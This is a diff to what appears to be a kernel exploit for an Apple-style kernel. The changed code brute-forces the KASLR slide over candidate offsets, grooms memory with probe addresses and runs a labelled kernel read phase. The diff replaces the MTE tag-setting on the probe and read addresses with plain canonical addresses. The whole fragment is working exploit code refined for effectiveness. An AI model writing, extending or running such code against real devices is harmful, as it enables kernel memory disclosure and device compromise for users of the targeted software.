@@ -24437,8 +24437,8 @@ new_modes:
                 for (int ci = r203_start; ci < R203_NUM_CANDS && !r203_found; ci++) {
                     uint64_t cand = R203_SLIDE_MIN + (uint64_t)ci * R203_SLIDE_STEP;
                     uint64_t bss_raw = R198_KC_BASE + cand + BSS_MID_DEFAULT;
-                    uint64_t bss_probe = (bss_raw & ~(0xFULL << 56)) | (0xFULL << 56);
-                    bss_probe = (bss_probe & ~(0xFULL << 60)) | (0xFULL << 60);
+                    /* Kernel __DATA pages use MTE tag 0x0; keep canonical addr */
+                    uint64_t bss_probe = bss_raw;
 
                     uint64_t r203_scan_data[4] = {bss_probe, 0, 0, 0};
                     p16_groom_data = r203_scan_data;
@@ -24581,8 +24581,8 @@ new_modes:
                 if (r203_found && r203_do_read) {
                     rlog("\n  --- KERNEL READ PHASE ---\n");
                     uint64_t r203_rraw = R198_KC_BASE + r203_found_slide + r203_read_off;
-                    uint64_t r203_rtarget = (r203_rraw & ~(0xFULL << 56)) | (0xFULL << 56);
-                    r203_rtarget = (r203_rtarget & ~(0xFULL << 60)) | (0xFULL << 60);
+                    /* Kernel segment pages use MTE tag 0x0; keep canonical addr */
+                    uint64_t r203_rtarget = r203_rraw;
 
                     rlog("  Read addr:  0x%016llx (kc+0x%llx)\n",
                          (unsigned long long)r203_rtarget,
@@ -24734,8 +24734,8 @@ new_modes:
                 for (int ci = r204_start; ci < r204_end; ci++) {
                     uint64_t cand = R203_SLIDE_MIN + (uint64_t)ci * R203_SLIDE_STEP;
                     uint64_t bss_raw = R198_KC_BASE + cand + BSS_MID_DEFAULT;
-                    uint64_t bss_probe = (bss_raw & ~(0xFULL << 56)) | (0xFULL << 56);
-                    bss_probe = (bss_probe & ~(0xFULL << 60)) | (0xFULL << 60);
+                    /* Kernel __DATA pages use MTE tag 0x0; keep canonical addr */
+                    uint64_t bss_probe = bss_raw;
 
                     uint64_t r204_scan_data[4] = {bss_probe, 0, 0, 0};
                     p16_groom_data = r204_scan_data;
